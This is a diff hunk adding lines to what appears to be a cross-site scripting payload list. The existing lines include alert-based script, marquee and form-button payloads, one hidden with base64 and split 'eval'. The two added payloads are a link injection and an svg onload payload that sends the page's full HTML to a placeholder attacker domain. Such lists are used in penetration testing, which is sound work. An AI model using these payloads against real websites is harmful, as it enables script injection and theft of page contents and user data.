@@ -38,3 +38,5 @@ alert(1)>//INJECTX
 <script>alert(1)<!--INJECTX
 <marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
 <form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//
+demo.innerHTML="click".link("http://{YourDOmain}.{TLD}");
+<svg/onload="(new Image()).src='//{YourDOmain}.{TLD}/'%2Bdocument.documentElement.innerHTML">
